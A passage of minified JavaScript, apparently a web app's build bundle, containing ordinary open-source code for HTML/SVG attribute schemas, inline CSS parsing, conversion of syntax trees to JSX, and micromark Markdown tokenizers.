ctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:J,overlineThickness:J,paintOrder:null,panose1:null,path:null,pathLength:J,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:Qe,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:J,pointsAtY:J,pointsAtZ:J,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:zt,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:zt,rev:zt,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:zt,requiredFeatures:zt,requiredFonts:zt,requiredFormats:zt,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:J,specularExponent:J,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:J,strikethroughThickness:J,string:null,stroke:null,strokeDashArray:zt,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:J,strokeOpacity:J,strokeWidth:null,style:null,surfaceScale:J,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:zt,tabIndex:J,tableValues:null,target:null,targetX:J,targetY:J,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:zt,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:J,underlineThickness:J,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:J,values:null,vAlphabetic:J,vMathematical:J,vectorEffect:null,vHanging:J,vIdeographic:J,version:null,vertAdvY:J,vertOriginX:J,vertOriginY:J,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:J,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:"svg",transform:Ip}),vp=_i({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:"xlink",transform(e,t){return"xlink:"+t.slice(5).toLowerCase()}}),Rp=_i({attributes:{xmlnsxlink:"xmlns:xlink"},properties:{xmlnsXLink:null,xmlns:null},space:"xmlns",transform:Np}),Op=_i({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:"xml",transform(e,t){return"xml:"+t.slice(3).toLowerCase()}}),X_={classId:"classID",dataType:"datatype",itemId:"itemID",strokeDashArray:"strokeDasharray",strokeDashOffset:"strokeDashoffset",strokeLineCap:"strokeLinecap",strokeLineJoin:"strokeLinejoin",strokeMiterLimit:"strokeMiterlimit",typeOf:"typeof",xLinkActuate:"xlinkActuate",xLinkArcRole:"xlinkArcrole",xLinkHref:"xlinkHref",xLinkRole:"xlinkRole",xLinkShow:"xlinkShow",xLinkTitle:"xlinkTitle",xLinkType:"xlinkType",xmlnsXLink:"xmlnsXlink"},G_=/[A-Z]/g,K0=/-[a-z]/g,V_=/^data[-\w.:]+$/i;function ko(e,t){const r=Ra(t);let a=t,o=Dt;if(r in e.normal)return e.property[e.normal[r]];if(r.length>4&&r.slice(0,4)==="data"&&V_.test(t)){if(t.charAt(4)==="-"){const s=t.slice(5).replace(K0,q_);a="data"+s.charAt(0).toUpperCase()+s.slice(1)}else{const s=t.slice(4);if(!K0.test(s)){let l=s.replace(G_,$_);l.charAt(0)!=="-"&&(l="-"+l),t="data"+l}}o=bc}return new o(a,t)}function $_(e){return"-"+e.toLowerCase()}function q_(e){return e.charAt(1).toUpperCase()}const Ba=Lp([kp,Q_,vp,Rp,Op],"html"),cr=Lp([kp,Y_,vp,Rp,Op],"svg");function J0(e){const t=String(e||"").trim();return t?t.split(/[ \t\n\r\f]+/g):[]}function Pp(e){return e.join(" ").trim()}var si={},Ol,Z0;function K_(){if(Z0)return Ol;Z0=1;var e=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,t=/\n/g,r=/^\s*/,a=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,o=/^:\s*/,s=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,l=/^[;\s]*/,h=/^\s+|\s+$/g,p=`
`,g="/",T="*",E="",_="comment",S="declaration";function I(P,w){if(typeof P!="string")throw new TypeError("First argument must be a string");if(!P)return[];w=w||{};var Q=1,j=1;function ie(ce){var re=ce.match(t);re&&(Q+=re.length);var Le=ce.lastIndexOf(p);j=~Le?ce.length-Le:j+ce.length}function de(){var ce={line:Q,column:j};return function(re){return re.position=new z(ce),xe(),re}}function z(ce){this.start=ce,this.end={line:Q,column:j},this.source=w.source}z.prototype.content=P;function me(ce){var re=new Error(w.source+":"+Q+":"+j+": "+ce);if(re.reason=ce,re.filename=w.source,re.line=Q,re.column=j,re.source=P,!w.silent)throw re}function Se(ce){var re=ce.exec(P);if(re){var Le=re[0];return ie(Le),P=P.slice(Le.length),re}}function xe(){Se(r)}function H(ce){var re;for(ce=ce||[];re=ue();)re!==!1&&ce.push(re);return ce}function ue(){var ce=de();if(!(g!=P.charAt(0)||T!=P.charAt(1))){for(var re=2;E!=P.charAt(re)&&(T!=P.charAt(re)||g!=P.charAt(re+1));)++re;if(re+=2,E===P.charAt(re-1))return me("End of comment missing");var Le=P.slice(2,re-2);return j+=2,ie(Le),P=P.slice(re),j+=2,ce({type:_,comment:Le})}}function oe(){var ce=de(),re=Se(a);if(re){if(ue(),!Se(o))return me("property missing ':'");var Le=Se(s),ke=ce({type:S,property:F(re[0].replace(e,E)),value:Le?F(Le[0].replace(e,E)):E});return Se(l),ke}}function Ae(){var ce=[];H(ce);for(var re;re=oe();)re!==!1&&(ce.push(re),H(ce));return ce}return xe(),Ae()}function F(P){return P?P.replace(h,E):E}return Ol=I,Ol}var eh;function J_(){if(eh)return si;eh=1;var e=si&&si.__importDefault||function(a){return a&&a.__esModule?a:{default:a}};Object.defineProperty(si,"__esModule",{value:!0}),si.default=r;const t=e(K_());function r(a,o){let s=null;if(!a||typeof a!="string")return s;const l=(0,t.default)(a),h=typeof o=="function";return l.forEach(p=>{if(p.type!=="declaration")return;const{property:g,value:T}=p;h?o(g,T,p):T&&(s=s||{},s[g]=T)}),s}return si}var fa={},th;function Z_(){if(th)return fa;th=1,Object.defineProperty(fa,"__esModule",{value:!0}),fa.camelCase=void 0;var e=/^--[a-zA-Z0-9_-]+$/,t=/-([a-z])/g,r=/^[^-]+$/,a=/^-(webkit|moz|ms|o|khtml)-/,o=/^-(ms)-/,s=function(g){return!g||r.test(g)||e.test(g)},l=function(g,T){return T.toUpperCase()},h=function(g,T){return"".concat(T,"-")},p=function(g,T){return T===void 0&&(T={}),s(g)?g:(g=g.toLowerCase(),T.reactCompat?g=g.replace(o,h):g=g.replace(a,h),g.replace(t,l))};return fa.camelCase=p,fa}var ha,nh;function eS(){if(nh)return ha;nh=1;var e=ha&&ha.__importDefault||function(o){return o&&o.__esModule?o:{default:o}},t=e(J_()),r=Z_();function a(o,s){var l={};return!o||typeof o!="string"||(0,t.default)(o,function(h,p){h&&p&&(l[(0,r.camelCase)(h,s)]=p)}),l}return a.default=a,ha=a,ha}var tS=eS();const nS=yo(tS),Io=wp("end"),Tn=wp("start");function wp(e){return t;function t(r){const a=r&&r.position&&r.position[e]||{};if(typeof a.line=="number"&&a.line>0&&typeof a.column=="number"&&a.column>0)return{line:a.line,column:a.column,offset:typeof a.offset=="number"&&a.offset>-1?a.offset:void 0}}}function rS(e){const t=Tn(e),r=Io(e);if(t&&r)return{start:t,end:r}}function _a(e){return!e||typeof e!="object"?"":"position"in e||"type"in e?rh(e.position):"start"in e||"end"in e?rh(e):"line"in e||"column"in e?ac(e):""}function ac(e){return ih(e&&e.line)+":"+ih(e&&e.column)}function rh(e){return ac(e&&e.start)+"-"+ac(e&&e.end)}function ih(e){return e&&typeof e=="number"?e:1}class yt extends Error{constructor(t,r,a){super(),typeof r=="string"&&(a=r,r=void 0);let o="",s={},l=!1;if(r&&("line"in r&&"column"in r?s={place:r}:"start"in r&&"end"in r?s={place:r}:"type"in r?s={ancestors:[r],place:r.position}:s={...r}),typeof t=="string"?o=t:!s.cause&&t&&(l=!0,o=t.message,s.cause=t),!s.ruleId&&!s.source&&typeof a=="string"){const p=a.indexOf(":");p===-1?s.ruleId=a:(s.source=a.slice(0,p),s.ruleId=a.slice(p+1))}if(!s.place&&s.ancestors&&s.ancestors){const p=s.ancestors[s.ancestors.length-1];p&&(s.place=p.position)}const h=s.place&&"start"in s.place?s.place.start:s.place;this.ancestors=s.ancestors||void 0,this.cause=s.cause||void 0,this.column=h?h.column:void 0,this.fatal=void 0,this.file="",this.message=o,this.line=h?h.line:void 0,this.name=_a(s.place)||"1:1",this.place=s.place||void 0,this.reason=this.message,this.ruleId=s.ruleId||void 0,this.source=s.source||void 0,this.stack=l&&s.cause&&typeof s.cause.stack=="string"?s.cause.stack:"",this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}}yt.prototype.file="";yt.prototype.name="";yt.prototype.reason="";yt.prototype.message="";yt.prototype.stack="";yt.prototype.column=void 0;yt.prototype.line=void 0;yt.prototype.ancestors=void 0;yt.prototype.cause=void 0;yt.prototype.fatal=void 0;yt.prototype.place=void 0;yt.prototype.ruleId=void 0;yt.prototype.source=void 0;const _c={}.hasOwnProperty,iS=new Map,aS=/[A-Z]/g,uS=new Set(["table","tbody","thead","tfoot","tr"]),oS=new Set(["td","th"]),Dp="https://github.com/syntax-tree/hast-util-to-jsx-runtime";function sS(e,t){if(!t||t.Fragment===void 0)throw new TypeError("Expected `Fragment` in options");const r=t.filePath||void 0;let a;if(t.development){if(typeof t.jsxDEV!="function")throw new TypeError("Expected `jsxDEV` in options when `development: true`");a=gS(r,t.jsxDEV)}else{if(typeof t.jsx!="function")throw new TypeError("Expected `jsx` in production options");if(typeof t.jsxs!="function")throw new TypeError("Expected `jsxs` in production options");a=mS(r,t.jsx,t.jsxs)}const o={Fragment:t.Fragment,ancestors:[],components:t.components||{},create:a,elementAttributeNameCase:t.elementAttributeNameCase||"react",evaluater:t.createEvaluater?t.createEvaluater():void 0,filePath:r,ignoreInvalidStyle:t.ignoreInvalidStyle||!1,passKeys:t.passKeys!==!1,passNode:t.passNode||!1,schema:t.space==="svg"?cr:Ba,stylePropertyNameCase:t.stylePropertyNameCase||"dom",tableCellAlignToStyle:t.tableCellAlignToStyle!==!1},s=Mp(o,e,void 0);return s&&typeof s!="string"?s:o.create(e,o.Fragment,{children:s||void 0},void 0)}function Mp(e,t,r){if(t.type==="element")return lS(e,t,r);if(t.type==="mdxFlowExpression"||t.type==="mdxTextExpression")return cS(e,t);if(t.type==="mdxJsxFlowElement"||t.type==="mdxJsxTextElement")return fS(e,t,r);if(t.type==="mdxjsEsm")return dS(e,t);if(t.type==="root")return hS(e,t,r);if(t.type==="text")return pS(e,t)}function lS(e,t,r){const a=e.schema;let o=a;t.tagName.toLowerCase()==="svg"&&a.space==="html"&&(o=cr,e.schema=o),e.ancestors.push(t);const s=Bp(e,t.tagName,!1),l=ES(e,t);let h=yc(e,t);return uS.has(t.tagName)&&(h=h.filter(function(p){return typeof p=="string"?!W_(p):!0})),Fp(e,l,s,t),Sc(l,h),e.ancestors.pop(),e.schema=a,e.create(t,s,l,r)}function cS(e,t){if(t.data&&t.data.estree&&e.evaluater){const a=t.data.estree.body[0];return a.type,e.evaluater.evaluateExpression(a.expression)}Oa(e,t.position)}function dS(e,t){if(t.data&&t.data.estree&&e.evaluater)return e.evaluater.evaluateProgram(t.data.estree);Oa(e,t.position)}function fS(e,t,r){const a=e.schema;let o=a;t.name==="svg"&&a.space==="html"&&(o=cr,e.schema=o),e.ancestors.push(t);const s=t.name===null?e.Fragment:Bp(e,t.name,!0),l=TS(e,t),h=yc(e,t);return Fp(e,l,s,t),Sc(l,h),e.ancestors.pop(),e.schema=a,e.create(t,s,l,r)}function hS(e,t,r){const a={};return Sc(a,yc(e,t)),e.create(t,e.Fragment,a,r)}function pS(e,t){return t.value}function Fp(e,t,r,a){typeof r!="string"&&r!==e.Fragment&&e.passNode&&(t.node=a)}function Sc(e,t){if(t.length>0){const r=t.length>1?t:t[0];r&&(e.children=r)}}function mS(e,t,r){return a;function a(o,s,l,h){const g=Array.isArray(l.children)?r:t;return h?g(s,l,h):g(s,l)}}function gS(e,t){return r;function r(a,o,s,l){const h=Array.isArray(s.children),p=Tn(a);return t(o,s,l,h,{columnNumber:p?p.column-1:void 0,fileName:e,lineNumber:p?p.line:void 0},void 0)}}function ES(e,t){const r={};let a,o;for(o in t.properties)if(o!=="children"&&_c.call(t.properties,o)){const s=bS(e,o,t.properties[o]);if(s){const[l,h]=s;e.tableCellAlignToStyle&&l==="align"&&typeof h=="string"&&oS.has(t.tagName)?a=h:r[l]=h}}if(a){const s=r.style||(r.style={});s[e.stylePropertyNameCase==="css"?"text-align":"textAlign"]=a}return r}function TS(e,t){const r={};for(const a of t.attributes)if(a.type==="mdxJsxExpressionAttribute")if(a.data&&a.data.estree&&e.evaluater){const s=a.data.estree.body[0];s.type;const l=s.expression;l.type;const h=l.properties[0];h.type,Object.assign(r,e.evaluater.evaluateExpression(h.argument))}else Oa(e,t.position);else{const o=a.name;let s;if(a.value&&typeof a.value=="object")if(a.value.data&&a.value.data.estree&&e.evaluater){const h=a.value.data.estree.body[0];h.type,s=e.evaluater.evaluateExpression(h.expression)}else Oa(e,t.position);else s=a.value===null?!0:a.value;r[o]=s}return r}function yc(e,t){const r=[];let a=-1;const o=e.passKeys?new Map:iS;for(;++a<t.children.length;){const s=t.children[a];let l;if(e.passKeys){const p=s.type==="element"?s.tagName:s.type==="mdxJsxFlowElement"||s.type==="mdxJsxTextElement"?s.name:void 0;if(p){const g=o.get(p)||0;l=p+"-"+g,o.set(p,g+1)}}const h=Mp(e,s,l);h!==void 0&&r.push(h)}return r}function bS(e,t,r){const a=ko(e.schema,t);if(!(r==null||typeof r=="number"&&Number.isNaN(r))){if(Array.isArray(r)&&(r=a.commaSeparated?Ap(r):Pp(r)),a.property==="style"){let o=typeof r=="object"?r:_S(e,String(r));return e.stylePropertyNameCase==="css"&&(o=SS(o)),["style",o]}return[e.elementAttributeNameCase==="react"&&a.space?X_[a.property]||a.property:a.attribute,r]}}function _S(e,t){try{return nS(t,{reactCompat:!0})}catch(r){if(e.ignoreInvalidStyle)return{};const a=r,o=new yt("Cannot parse `style` attribute",{ancestors:e.ancestors,cause:a,ruleId:"style",source:"hast-util-to-jsx-runtime"});throw o.file=e.filePath||void 0,o.url=Dp+"#cannot-parse-style-attribute",o}}function Bp(e,t,r){let a;if(!r)a={type:"Literal",value:t};else if(t.includes(".")){const o=t.split(".");let s=-1,l;for(;++s<o.length;){const h=V0(o[s])?{type:"Identifier",name:o[s]}:{type:"Literal",value:o[s]};l=l?{type:"MemberExpression",object:l,property:h,computed:!!(s&&h.type==="Literal"),optional:!1}:h}a=l}else a=V0(t)&&!/^[a-z]/.test(t)?{type:"Identifier",name:t}:{type:"Literal",value:t};if(a.type==="Literal"){const o=a.value;return _c.call(e.components,o)?e.components[o]:o}if(e.evaluater)return e.evaluater.evaluateExpression(a);Oa(e)}function Oa(e,t){const r=new yt("Cannot handle MDX estrees without `createEvaluater`",{ancestors:e.ancestors,place:t,ruleId:"mdx-estree",source:"hast-util-to-jsx-runtime"});throw r.file=e.filePath||void 0,r.url=Dp+"#cannot-handle-mdx-estrees-without-createevaluater",r}function SS(e){const t={};let r;for(r in e)_c.call(e,r)&&(t[yS(r)]=e[r]);return t}function yS(e){let t=e.replace(aS,CS);return t.slice(0,3)==="ms-"&&(t="-"+t),t}function CS(e){return"-"+e.toLowerCase()}const Pl={action:["form"],cite:["blockquote","del","ins","q"],data:["object"],formAction:["button","input"],href:["a","area","base","link"],icon:["menuitem"],itemId:null,manifest:["html"],ping:["a","area"],poster:["video"],src:["audio","embed","iframe","img","input","script","source","track","video"]},xS={};function Cc(e,t){const r=xS,a=typeof r.includeImageAlt=="boolean"?r.includeImageAlt:!0,o=typeof r.includeHtml=="boolean"?r.includeHtml:!0;return Hp(e,a,o)}function Hp(e,t,r){if(AS(e)){if("value"in e)return e.type==="html"&&!r?"":e.value;if(t&&"alt"in e&&e.alt)return e.alt;if("children"in e)return ah(e.children,t,r)}return Array.isArray(e)?ah(e,t,r):""}function ah(e,t,r){const a=[];let o=-1;for(;++o<e.length;)a[o]=Hp(e[o],t,r);return a.join("")}function AS(e){return!!(e&&typeof e=="object")}const uh=document.createElement("i");function xc(e){const t="&"+e+";";uh.innerHTML=t;const r=uh.textContent;return r.charCodeAt(r.length-1)===59&&e!=="semi"||r===t?!1:r}function Wt(e,t,r,a){const o=e.length;let s=0,l;if(t<0?t=-t>o?0:o+t:t=t>o?o:t,r=r>0?r:0,a.length<1e4)l=Array.from(a),l.unshift(t,r),e.splice(...l);else for(r&&e.splice(t,r);s<a.length;)l=a.slice(s,s+1e4),l.unshift(t,0),e.splice(...l),s+=1e4,t+=1e4}function qt(e,t){return e.length>0?(Wt(e,e.length,0,t),e):t}const oh={}.hasOwnProperty;function Up(e){const t={};let r=-1;for(;++r<e.length;)LS(t,e[r]);return t}function LS(e,t){let r;for(r in t){const o=(oh.call(e,r)?e[r]:void 0)||(e[r]={}),s=t[r];let l;if(s)for(l in s){oh.call(o,l)||(o[l]=[]);const h=s[l];kS(o[l],Array.isArray(h)?h:h?[h]:[])}}}function kS(e,t){let r=-1;const a=[];for(;++r<t.length;)(t[r].add==="after"?e:a).push(t[r]);Wt(e,0,0,a)}function zp(e,t){const r=Number.parseInt(e,t);return r<9||r===11||r>13&&r<32||r>126&&r<160||r>55295&&r<57344||r>64975&&r<65008||(r&65535)===65535||(r&65535)===65534||r>1114111?"�":String.fromCodePoint(r)}function sn(e){return e.replace(/[\t\n\r ]+/g," ").replace(/^ | $/g,"").toLowerCase().toUpperCase()}const Lt=dr(/[A-Za-z]/),St=dr(/[\dA-Za-z]/),IS=dr(/[#-'*+\--9=?A-Z^-~]/);function go(e){return e!==null&&(e<32||e===127)}const uc=dr(/\d/),NS=dr(/[\dA-Fa-f]/),vS=dr(/[!-/:-@[-`{-~]/);function Te(e){return e!==null&&e<-2}function We(e){return e!==null&&(e<0||e===32)}function we(e){return e===-2||e===-1||e===32}const No=dr(new RegExp("\\p{P}|\\p{S}","u")),Rr=dr(/\s/);function dr(e){return t;function t(r){return r!==null&&r>-1&&e.test(String.fromCharCode(r))}}function Si(e){const t=[];let r=-1,a=0,o=0;for(;++r<e.length;){const s=e.charCodeAt(r);let l="";if(s===37&&St(e.charCodeAt(r+1))&&St(e.charCodeAt(r+2)))o=2;else if(s<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(s))||(l=String.fromCharCode(s));else if(s>55295&&s<57344){const h=e.charCodeAt(r+1);s<56320&&h>56319&&h<57344?(l=String.fromCharCode(s,h),o=1):l="�"}else l=String.fromCharCode(s);l&&(t.push(e.slice(a,r),encodeURIComponent(l)),a=r+o+1,l=""),o&&(r+=o,o=0)}return t.join("")+e.slice(a)}function De(e,t,r,a){const o=a?a-1:Number.POSITIVE_INFINITY;let s=0;return l;function l(p){return we(p)?(e.enter(r),h(p)):t(p)}function h(p){return we(p)&&s++<o?(e.consume(p),h):(e.exit(r),t(p))}}const RS={tokenize:OS};function OS(e){const t=e.attempt(this.parser.constructs.contentInitial,a,o);let r;return t;function a(h){if(h===null){e.consume(h);return}return e.enter("lineEnding"),e.consume(h),e.exit("lineEnding"),De(e,t,"linePrefix")}function o(h){return e.enter("paragraph"),s(h)}function s(h){const p=e.enter("chunkText",{contentType:"text",previous:r});return r&&(r.next=p),r=p,l(h)}function l(h){if(h===null){e.exit("chunkText"),e.exit("paragraph"),e.consume(h);return}return Te(h)?(e.consume(h),e.exit("chunkText"),s):(e.consume(h),l)}}const PS={tokenize:wS},sh={tokenize:DS};function wS(e){const t=this,r=[];let a=0,o,s,l;return h;function h(j){if(a<r.length){const ie=r[a];return t.containerState=ie[1],e.attempt(ie[0].continuation,p,g)(j)}return g(j)}function p(j){if(a++,t.containerState._closeFlow){t.containerState._closeFlow=void 0,o&&Q();const ie=t.events.length;let de=ie,z;for(;de--;)if(t.events[de][0]==="exit"&&t.events[de][1].type==="chunkFlow"){z=t.events[de][1].end;break}w(a);let me=ie;for(;me<t.events.length;)t.events[me][1].end={...z},me++;return Wt(t.events,de+1,0,t.events.slice(ie)),t.events.length=me,g(j)}return h(j)}function g(j){if(a===r.length){if(!o)return _(j);if(o.currentConstruct&&o.currentConstruct.concrete)return I(j);t.interrupt=!!(o.currentConstruct&&!o._gfmTableDynamicInterruptHack)}return t.containerState={},e.check(sh,T,E)(j)}function T(j){return o&&Q(),w(a),_(j)}function E(j){return t.parser.lazy[t.now().line]=a!==r.length,l=t.now().offset,I(j)}function _(j){return t.containerState={},e.attempt(sh,S,I)(j)}function S(j){return a++,r.push([t.currentConstruct,t.containerState]),_(j)}function I(j){if(j===null){o&&Q(),w(0),e.consume(j);return}return o=o||t.parser.flow(t.now()),e.enter("chunkFlow",{_tokenizer:o,contentType:"flow",previous:s}),F(j)}function F(j){if(j===null){P(e.exit("chunkFlow"),!0),w(0),e.consume(j);return}return Te(j)?(e.consume(j),P(e.exit("chunkFlow")),a=0,t.interrupt=void 0,h):(e.consume(j),F)}function P(j,ie){const de=t.sliceStream(j);if(ie&&de.push(null),j.previous=s,s&&(s.next=j),s=j,o.defineSkip(j.start),o.write(de),t.parser.lazy[j.start.line]){let z=o.events.length;for(;z--;)if(o.events[z][1].start.offset<l&&(!o.events[z][1].end||o.events[z][1].end.offset>l))return;const me=t.events.length;let Se=me,xe,H;for(;Se--;)if(t.events[Se][0]==="exit"&&t.events[Se][1].type==="chunkFlow"){if(xe){H=t.events[Se][1].end;break}xe=!0}for(w(a),z=me;z<t.events.length;)t.events[z][1].end={...H},z++;Wt(t.events,Se+1,0,t.events.slice(me)),t.events.length=z}}function w(j){let ie=r.length;for(;ie-- >j;){const de=r[ie];t.containerState=de[1],de[0].exit.call(t,e)}r.length=j}function Q(){o.write([null]),s=void 0,o=void 0,t.containerState._closeFlow=void 0}}function DS(e,t,r){return De(e,e.attempt(this.parser.constructs.document,t,r),"linePrefix",this.parser.constructs.disable.null.includes("codeIndented")?void 0:4)}function gi(e){if(e===null||We(e)||Rr(e))return 1;if(No(e))return 2}function vo(e,t,r){const a=[];let o=-1;for(;++o<e.length;){const s=e[o].resolveAll;s&&!a.includes(s)&&(t=s(t,r),a.push(s))}return t}const oc={name:"attention",resolveAll:MS,tokenize:FS};function MS(e,t){let r=-1,a,o,s,l,h,p,g,T;for(;++r<e.length;)if(e[r][0]==="enter"&&e[r][1].type==="attentionSequence"&&e[r][1]._close){for(a=r;a--;)if(e[a][0]==="exit"&&e[a][1].type==="attentionSequence"&&e[a][1]._open&&t.sliceSerialize(e[a][1]).charCodeAt(0)===t.sliceSerialize(e[r][1]).charCodeAt(0)){if((e[a][1]._close||e[r][1]._open)&&(e[r][1].end.offset-e[r][1].start.offset)%3&&!((e[a][1].end.offset-e[a][1].start.offset+e[r][1].end.offset-e[r][1].start.offset)%3))continue;p=e[a][1].end.offset-e[a][1].start.offset>1&&e[r][1].end.offset-e[r][1].start.offset>1?2:1;const E={...e[a][1].end},_={...e[r][1].start};lh(E,-p),lh(_,p),l={type:p>1?"strongSequence":"emphasisSequence",start:E,end:{...e[a][1].end}},h={type:p>1?"strongSequence":"emphasisSequence",start:{...e[r][1].start},end:_},s={type:p>1?"strongText":"emphasisText",start:{...e[a][1].end},end:{...e[r][1].start}},o={type:p>1?"strong":"emphasis",start:{...l.start},end:{...h.end}},e[a][1].end={...l.start},e[r][1].start={...h.end},g=[],e[a][1].end.offset-e[a][1].start.offset&&(g=qt(g,[["enter",e[a][1],t],["exit",e[a][1],t]])),g=qt(g,[["enter",o,t],["enter",l,t],["exit",l,t],["enter",s,t]]),g=qt(g,vo(t.parser.constructs.insideSpan.null,e.slice(a+1,r),t)),g=qt(g,[["exit",s,t],["enter",h,t],["exit",h,t],["exit",o,t]]),e[r][1].end.offset-e[r][1].start.offset?(T=2,g=qt(g,[["enter",e[r][1],t],["exit",e[r][1],t]])):T=0,Wt(e,a-1,r-a+3,g),r=a+g.length-T-2;break}}for(r=-1;++r<e.length;)e[r][1].type==="attentionSequence"&&(e[r][1].type="data");return e}function FS(e,t){const r=this.parser.constructs.attentionMarkers.null,a=this.previous,o=gi(a);let s;return l;function l(p){return s=p,e.enter("attentionSequence"),h(p)}function h(p){if(p===s)return e.consume(p),h;const g=e.exit("attentionSequence"),T=gi(p),E=!T||T===2&&o||r.includes(p),_=!o||o===2&&T||r.includes(a);return g._open=!!(s===42?E:E&&(o||!_)),g._close=!!(s===42?_:_&&(T||!E)),t(p)}}function lh(e,t){e.column+=t,e.offset+=t,e._bufferIndex+=t}const BS={name:"autolink",tokenize:HS};function HS(e,t,r){let a=0;return o;function o(S){return e.enter("autolink"),e.enter("autolinkMarker"),e.consume(S),e.exit("autolinkMarker"),e.enter("autolinkProtocol"),s}function s(S){return Lt(S)?(e.consume(S),l):S===64?r(S):g(S)}function l(S){return S===43||S===45||S===46||St(S)?(a=1,h(S)):g(S)}function h(S){return S===58?(e.consume(S),a=0,p):(S===43||S===45||S===46||St(S))&&a++<32?(e.consume(S),h):(a=0,g(S))}function p(S){return S===62?(e.exit("autolinkProtocol"),e.enter("autolinkMarker"),e.consume(S),e.exit("autolinkMarker"),e.exit("autolink"),t):S===null||S===32||S===60||go(S)?r(S):(e.consume(S),p)}function g(S){return S===64?(e.consume(S),T):IS(S)?(e.consume(S),g):r(S)}function T(S){return St(S)?E(S):r(S)}function E(S){return S===46?(e.consume(S),a=0,T):S===62?(e.exit("autolinkProtocol").type="autolinkEmail",e.enter("autolinkMarker"),e.consume(S),e.exit("autolinkMarker"),e.exit("autolink"),t):_(S)}function _(S){if((S===45||St(S))&&a++<63){const I=S===45?_:E;return e.consume(S),I}return r(S)}}const Ha={partial:!0,tokenize:US};function US(e,t,r){return a;function a(s){return we(s)?De(e,o,"linePrefix")(s):o(s)}function o(s){return s===null||Te(s)?t(s):r(s)}}const Wp={continuation:{tokenize:WS},exit:jS,name:"blockQuote",tokenize:zS};function zS(e,t,r){const a=this;return o;function o(l){if(l===62){const h=a.containerState;return h.open||(e.enter("blockQuote",{_container:!0}),h.open=!0),e.enter("blockQuotePrefix"),e.enter("blockQuoteMarker"),e.consume(l),e.exit("blockQuoteMarker"),s}return r(l)}function s(l){return we(l)?(e.enter("blockQuotePrefixWhitespace"),e.consume(l),e.exit("blockQuotePrefixWhitespace"),e.exit("blockQuotePrefix"),t):(e.exit("blockQuotePrefix"),t(l))}}function WS(e,t,r){const a=this;return o;function o(l){return we(l)?De(e,s,"linePrefix",a.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(l):s(l)}function s(l){return e.attempt(Wp,t,r)(l)}}function jS(e){e.exit("blockQuote")}const jp={name:"characterEscape",tokenize:QS};function QS(e,t,r){return a;function a(s){return e.enter("characterEscape"),e.enter("escapeMarker"),e.consume(s),e.exit("escapeMarker"),o}function o(s){return vS(s)?(e.enter("characterEscapeValue"),e.consume(s),e.exit("characterEscapeValue"),e.exit("characterEscape"),t):r(s)}}const Qp={name:"characterReference",tokenize:YS};function YS(e,t,r){const a=this;let o=0,s,l;return h;function h(E){return e.enter("characterReference"),e.enter("characterReferenceMarker"),e.consume(E),e.exit("characterReferenceMarker"),p}function p(E){return E===35?(e.enter("characterReferenceMarkerNumeric"),e.consume(E),e.exit("characterReferenceMarkerNumeric"),g):(e.enter("characterReferenceValue"),s=31,l=St,T(E))}function g(E){return E===88||E===120?(e.enter("characterReferenceMarkerHexadecimal"),e.consume(E),e.exit("characterReferenceMarkerHexadecimal"),e.enter("characterReferenceValue"),s=6,l=NS,T):(e.enter("characterReferenceValue"),s=7,l=uc,T(E))}function T(E){if(E===59&&o){const _=e.exit("characterReferenceValue");return l===St&&!xc(a.sliceSerialize(_))?r(E):(e.enter("characterReferenceMarker"),e.consume(E),e.exit("characterReferenceMarker"),e.exit("characterReference"),t)}return l(E)&&o++<s?(e.consume(E),T):r(E)}}const ch={partial:!0,tokenize:GS},dh={concrete:!0,name:"codeFenced",tokenize:XS};function 